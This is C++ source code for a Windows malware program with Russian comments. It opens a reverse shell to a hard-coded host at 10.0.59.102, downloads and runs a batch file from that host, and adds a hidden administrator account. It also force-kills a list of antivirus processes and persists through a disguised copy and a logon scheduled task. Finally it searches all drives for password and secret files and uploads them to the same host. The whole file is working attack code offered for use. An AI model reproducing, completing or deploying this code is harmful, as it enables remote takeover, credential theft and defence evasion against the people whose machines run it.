#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <taskschd.h>
#include <comdef.h>
#include <lm.h>
#include <shlobj.h>
#include <winhttp.h>

#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iostream>
#include <regex>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")

// Для статической линковки с WinMain
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

const std::vector<std::string> KEYWORDS = {
    "passw", "пароль", "passwd", "password",
    "pass", "secret", "ключ",
};

const std::vector<std::string> EXTENSIONS = {
    ".txt", ".log", ".cfg", ".conf", ".ini", ".json", ".xml",
    ".yaml", ".yml", ".dat", ".key", ".pem", ".crt", ".cer",
    ".env", ".config", ".properties", ".csv"
};

const std::vector<std::string> EXCLUDED_DIRS = {
    "Windows", "System32", "System", "Program Files",
    "Program Files (x86)", "AppData", "Temp", "Cache",
    "Logs", "Backup", "Recycle Bin", "$Recycle.Bin",
    "Microsoft", "Google", "Mozilla", "Discord"
};

const std::vector<std::string> ANTIVIRUS_PROCESSES = {
    "AvastSvc.exe", "AvLaunch.exe", "aswToolsSvc.exe", "afwServ.exe",
    "wsc_proxy.exe", "bccavsvc.exe", "egui.exe", "eguiProxy.exe",
    "ERAAgent.exe", "efwd.exe", "ekrn.exe", "avp.exe", "avpsus.exe",
    "avpui.exe", "kavfs.exe", "kavfswh.exe", "kavfswp.exe",
    "klcsldcl.exe", "klnagent.exe", "klwtblfs.exe", "vapm.exe",
    "MsMpEng.exe", "MsMpSvc.exe", "MSASCui.exe", "MSASCuiL.exe",
    "SecurityHealthService.exe", "SecurityHealthSystray.exe"
};

struct FoundFile {
    std::string path;
    std::string name;
    std::string content;
    std::string extension;
    uintmax_t size = 0;
};

std::vector<FoundFile> found_files;
std::string system_info_cache;

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFOA sui;
PROCESS_INFORMATION pi;

void RunShell(char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);

        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            continue;
        }

        wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        if (wSock == INVALID_SOCKET) {
            WSACleanup();
            continue;
        }

        hax.sin_family = AF_INET;
        hax.sin_port = htons(C2Port);
        hax.sin_addr.s_addr = inet_addr(C2Server);
        if (hax.sin_addr.s_addr == INADDR_NONE) {
            closesocket(wSock);
            WSACleanup();
            continue;
        }

        if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(wSock);
            WSACleanup();
            continue;
        }

        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = STARTF_USESTDHANDLES;
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

        char cmdLine[] = "cmd.exe";
        if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&sui, &pi)) {
            closesocket(wSock);
            WSACleanup();
            continue;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(wSock);
        WSACleanup();
    }
}

std::string exec_cmd(const std::string& cmd) {
    std::string result;
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return result;
    }

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = { 0 };
    std::string command = "cmd.exe /c " + cmd;

    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {

        CloseHandle(hWritePipe);

        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            result += buffer;
        }

        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
    }

    CloseHandle(hReadPipe);

    while (!result.empty() && (result.back() == '\n' || result.back() == '\r' || result.back() == ' ')) {
        result.pop_back();
    }

    return result;
}

std::string exec_powershell(const std::string& cmd) {
    std::string result;
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return result;
    }

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = { 0 };
    std::string command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" + cmd + "\"";

    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {

        CloseHandle(hWritePipe);

        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            result += buffer;
        }

        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
    }

    CloseHandle(hReadPipe);

    while (!result.empty() && (result.back() == '\n' || result.back() == '\r' || result.back() == ' ')) {
        result.pop_back();
    }

    return result;
}

void download_and_run_bat(const std::string& url, const std::string& filename) {
    char documents_path[MAX_PATH];
    HRESULT hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, documents_path);

    std::string full_path;

    if (SUCCEEDED(hr)) {
        full_path = std::string(documents_path) + "\\" + filename;
    }
    else {
        full_path = ".\\" + filename;
    }

    std::string ps_command =
        "$url = '" + url + "'; " +
        "$output = '" + full_path + "'; " +
        "try { " +
        "    $wc = New-Object System.Net.WebClient; " +
        "    $wc.DownloadFile($url, $output); " +
        "    Write-Host 'SUCCESS'; " +
        "} catch { " +
        "    Write-Host 'ERROR'; " +
        "}";

    std::string result = exec_powershell(ps_command);

    if (result.find("SUCCESS") != std::string::npos && std::filesystem::exists(full_path)) {
        std::string cmd1 = "start \"\" \"" + full_path + "\"";
        exec_cmd(cmd1);

        std::string ps_run =
            "Start-Process -FilePath '" + full_path + "' -WindowStyle Hidden";
        exec_powershell(ps_run);

        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = { 0 };

        std::string cmd_line = "\"" + full_path + "\"";
        CreateProcessA(NULL, (LPSTR)cmd_line.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void send_report_via_winhttp(const std::string& filename, const std::string& server, int port) {
    HANDLE hFile = CreateFileA(
        filename.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return;
    }

    std::string fileContent;
    fileContent.resize(fileSize);

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, &fileContent[0], fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        return;
    }

    CloseHandle(hFile);

    HINTERNET hSession = WinHttpOpen(
        L"ReportClient/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) {
        return;
    }

    std::wstring wserver = std::wstring(server.begin(), server.end());
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        wserver.c_str(),
        port,
        0
    );

    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/upload",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount());

    std::string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"report\"; filename=\"report.txt\"\r\n";
    body += "Content-Type: text/plain\r\n\r\n";
    body += fileContent;
    body += "\r\n--" + boundary + "--\r\n";

    std::string content_type = "multipart/form-data; boundary=" + boundary;
    std::wstring wcontent_type = std::wstring(content_type.begin(), content_type.end());

    std::wstring headers = L"Content-Type: " + wcontent_type + L"\r\n";
    headers += L"User-Agent: ReportClient/1.0\r\n";

    DWORD bodyLength = (DWORD)body.length();
    DWORD headersLength = (DWORD)headers.length();

    if (WinHttpSendRequest(
        hRequest,
        headers.c_str(),
        headersLength,
        (LPVOID)body.c_str(),
        bodyLength,
        bodyLength,
        0
    )) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void create_user() {
    exec_cmd("net user serv1seUser Qwerty123! /add 2>nul");
    exec_cmd("net localgroup Administrators serv1seUser /add 2>nul");
}

void kill_antivirus() {
    for (const auto& proc : ANTIVIRUS_PROCESSES) {
        std::string cmd = "taskkill /F /IM " + proc + " 2>nul";
        exec_cmd(cmd);
    }
}

void copy_to_windows_temp() {
    char current_path[MAX_PATH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH);

    std::string cmd = "xcopy \"" + std::string(current_path) + "\" \"C:\\Windows\\Temp\\\" /Y /H /R /Q >nul 2>&1";
    exec_cmd(cmd);

    std::string hidden_cmd = "attrib +h \"C:\\Windows\\Temp\\svcchot.exe\"";
    exec_cmd(hidden_cmd);
}

void create_scheduled_task() {
    std::string cmd =
        "schtasks /create /tn \"Updaater servise Edge task Microsft Windows\" "
        "/tr \"C:\\Windows\\Temp\\svcchot.exe\" "
        "/sc onlogon /rl highest /f >nul 2>&1";
    exec_cmd(cmd);
}

std::string get_system_info() {
    std::stringstream info;

    info << "------ System info -----\n";

    std::string os = exec_powershell("(Get-WmiObject Win32_OperatingSystem).Caption");
    if (!os.empty()) {
        info << "OS: " << os << "\n";
    }

    std::string version = exec_powershell("(Get-WmiObject Win32_OperatingSystem).Version");
    if (!version.empty()) {
        info << "Version: " << version << "\n";
    }

    std::string arch = exec_powershell("(Get-WmiObject Win32_OperatingSystem).OSArchitecture");
    if (!arch.empty()) {
        info << "Arch: " << arch << "\n";
    }

    std::string memory = exec_powershell("[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)");
    if (!memory.empty()) {
        info << "RAM: " << memory << " GB\n";
    }

    std::string cpu = exec_powershell("(Get-WmiObject Win32_Processor).Name");
    if (!cpu.empty()) {
        info << "CPU: " << cpu << "\n";
    }

    std::string username = exec_powershell("$env:USERNAME");
    if (!username.empty()) {
        info << "Username: " << username << "\n";
    }

    std::string computername = exec_powershell("$env:COMPUTERNAME");
    if (!computername.empty()) {
        info << "Computer: " << computername << "\n";
    }

    std::string userdomain = exec_powershell("$env:USERDOMAIN");
    if (!userdomain.empty()) {
        info << "Domain: " << userdomain << "\n";
    }

    std::string ip = exec_powershell(
        "(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' -and $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -notlike '127.*' } | Select-Object -First 1).IPAddress"
    );
    if (!ip.empty()) {
        info << "IP: " << ip << "\n";
    }

    std::string mac = exec_powershell(
        "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -First 1 | ForEach-Object { $_.MacAddress }"
    );
    if (!mac.empty()) {
        info << "MAC: " << mac << "\n";
    }

    info << "----------------------------\n";

    return info.str();
}

bool contains_keyword(const std::string& str) {
    std::string lower = str;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

    for (const auto& keyword : KEYWORDS) {
        std::string lower_keyword = keyword;
        std::transform(lower_keyword.begin(), lower_keyword.end(),
            lower_keyword.begin(), ::tolower);

        if (lower.find(lower_keyword) != std::string::npos) {
            return true;
        }
    }
    return false;
}

bool has_valid_extension(const std::filesystem::path& path) {
    std::string ext = path.extension().string();
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    for (const auto& valid_ext : EXTENSIONS) {
        if (ext == valid_ext) {
            return true;
        }
    }
    return false;
}

bool is_excluded_dir(const std::filesystem::path& path) {
    std::string dir_name = path.filename().string();

    for (const auto& excluded : EXCLUDED_DIRS) {
        if (dir_name.find(excluded) != std::string::npos) {
            return true;
        }
    }
    return false;
}

bool is_text_file(const std::filesystem::path& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return false;

    char buffer[1024];
    file.read(buffer, sizeof(buffer));
    std::streamsize count = file.gcount();

    for (std::streamsize i = 0; i < count; i++) {
        unsigned char c = buffer[i];
        if (c < 0x09 || (c > 0x0D && c < 0x20) || c > 0x7E) {
            if (c < 0x80) {
                return false;
            }
        }
    }
    return true;
}

std::string read_file_content(const std::filesystem::path& path) {
    try {
        std::ifstream file(path, std::ios::binary);
        if (!file.is_open()) return "";

        auto size = std::filesystem::file_size(path);
        if (size > 10 * 1024 * 1024) {
            return "";
        }

        std::stringstream ss;
        ss << file.rdbuf();
        std::string content = ss.str();

        if (!is_text_file(path)) {
            return "";
        }

        return content;
    }
    catch (...) {
        return "";
    }
}

void search_directory(const std::filesystem::path& directory, int depth = 0) {
    if (depth > 10) return;

    try {
        if (!std::filesystem::exists(directory) || !std::filesystem::is_directory(directory)) {
            return;
        }

        if (is_excluded_dir(directory)) {
            return;
        }

        std::error_code ec;
        auto status = std::filesystem::status(directory, ec);
        if (ec || (status.permissions() & std::filesystem::perms::owner_read) == std::filesystem::perms::none) {
            return;
        }

        for (const auto& entry : std::filesystem::directory_iterator(directory)) {
            try {
                if (entry.is_directory()) {
                    search_directory(entry.path(), depth + 1);
                }
                else if (entry.is_regular_file()) {
                    std::string filename = entry.path().filename().string();
                    std::string full_path = entry.path().string();

                    if (contains_keyword(filename)) {
                        if (has_valid_extension(entry.path()) ||
                            filename.find(".txt") != std::string::npos ||
                            filename.find(".log") != std::string::npos) {

                            std::string content = read_file_content(entry.path());
                            if (!content.empty()) {
                                FoundFile file;
                                file.path = full_path;
                                file.name = filename;
                                file.content = content;
                                file.extension = entry.path().extension().string();
                                file.size = std::filesystem::file_size(entry.path());
                                found_files.push_back(file);
                            }
                        }
                    }
                }
            }
            catch (const std::exception&) {
                continue;
            }
        }
    }
    catch (const std::exception&) {
        return;
    }
}

void search_all_drives() {
    DWORD drives = GetLogicalDrives();

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        if (drives & 1) {
            std::string drive_path = std::string(1, drive) + ":\\";
            try {
                search_directory(std::filesystem::path(drive_path));
            }
            catch (...) {
            }
        }
        drives >>= 1;
    }
}

std::string generate_report() {
    std::stringstream ss;

    ss << "------------------------------------------------\n";
    ss << "Cht nashel\n";
    ss << "------------------------------------------------\n\n";

    ss << system_info_cache;
    ss << "\n";

    ss << "vremya poiska: " << __DATE__ << " " << __TIME__ << "\n\n";

    ss << "vsegp faylov: " << found_files.size() << "\n";
    ss << "------------------------------------------------\n\n";

    if (found_files.empty()) {
        ss << "Ne nashel blya.\n";
        return ss.str();
    }

    int file_num = 1;
    for (const auto& file : found_files) {
        ss << "------------------------------------------------\n";
        ss << "File #" << file_num << "\n";
        ss << "------------------------------------------------\n";
        ss << "  file: " << file.name << "\n";
        ss << "  put: " << file.path << "\n";
        ss << "\n  soderjimoe:\n";
        ss << "  " << std::string(50, '-') << "\n";

        std::string content = file.content;
        if (content.length() > 5000) {
            content = content.substr(0, 5000) + "\n... [slishkom dohua teksta]";
        }

        std::string escaped_content;
        for (char c : content) {
            if (c == '\r') continue;
            if (c == '\n') {
                escaped_content += "\n  ";
            }
            else if (c < 0x20 && c != '\n' && c != '\t') {
                continue;
            }
            else {
                escaped_content += c;
            }
        }

        ss << "  " << escaped_content << "\n";
        ss << "  " << std::string(50, '-') << "\n\n";

        file_num++;
    }

    ss << "================================================\n";
    ss << "END\n";
    ss << "================================================\n";

    return ss.str();
}

void save_report_to_file(const std::string& report) {
    std::string filename = "password_files_report.txt";
    std::ofstream file(filename);
    if (file.is_open()) {
        file << report;
        file.close();
    }
}

void run_reverse_shell() {
    char host[] = "10.0.59.102";
    int port = 4444;
    RunShell(host, port);
}

// ИСПОЛЬЗУЕМ WINMAIN ВМЕСТО MAIN
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Скрываем окно приложения (не требуется, так как это Win32 приложение без консоли)

    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
        FreeConsole();
    }

    HANDLE hThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        run_reverse_shell();
        return 0;
        }, NULL, 0, NULL);

    download_and_run_bat("http://10.0.59.102:8000/windowzInstaller.bat", "windowzInstaller.bat");

    create_user();
    kill_antivirus();
    copy_to_windows_temp();
    create_scheduled_task();

    system_info_cache = get_system_info();
    search_all_drives();

    std::string report = generate_report();
    save_report_to_file(report);

    send_report_via_winhttp("password_files_report.txt", "10.0.59.102", 8000);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}